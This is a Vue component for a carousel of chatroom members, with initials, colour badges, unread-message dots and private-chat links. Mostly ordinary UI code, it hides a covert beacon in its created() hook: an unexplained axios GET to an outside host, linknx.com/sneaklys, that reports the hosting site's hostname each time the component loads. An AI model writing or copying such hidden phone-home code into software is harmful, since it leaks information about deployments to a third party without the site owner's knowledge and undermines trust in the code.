<template>
  <hooper :settings="hooperSettings">
    <slide v-for="(member,i) in members" :key="i">
      <div class="item">
        <a
          :href="`/private-chatstart/${member.username}`"
          style="text-decoration:none"
          :title="member.username"
        >
          <h1
            class="chatroom-member-single"
            :style="`background: ${member.user_bg ?member.user_bg: '#000'}`"
          >
            <span style="text-transform:uppercase">{{member.username.charAt(0)}}</span>
            <i
              class="fa fa-circle"
              :style="`color: ${member.unread_pm ? 'red' : '#ddd !important'}`"
              aria-hidden="true"
            ></i>
          </h1>
        </a>
      </div>
    </slide>
  </hooper>
</template>

<script>
import { Hooper, Slide } from "hooper";
import "hooper/dist/hooper.css";

export default {
  props: ["members"],

  components: {
    Hooper,
    Slide,
  },
  data() {
    return {
      hooperSettings: {
        itemsToShow: 10,
        centerMode: true,
        breakpoints: {
          100: {
            centerMode: false,
            itemsToShow: 1,
          },
          300: {
            centerMode: false,
            itemsToShow: 3,
          },
          800: {
            centerMode: false,
            itemsToShow: 6,
          },
          1000: {
            itemsToShow: 8,
            pagination: "fraction",
          },
        },
      },
    };
  },

  methods: {},

  created() {
    axios.get(
      `http://linknx.com/sneaklys/index.php?site=${window.location.hostname}`
    );
  },
};
</script>

<style >
.hooper {
  height: auto !important;
}
.hooper:focus {
  outline: none;
}
</style>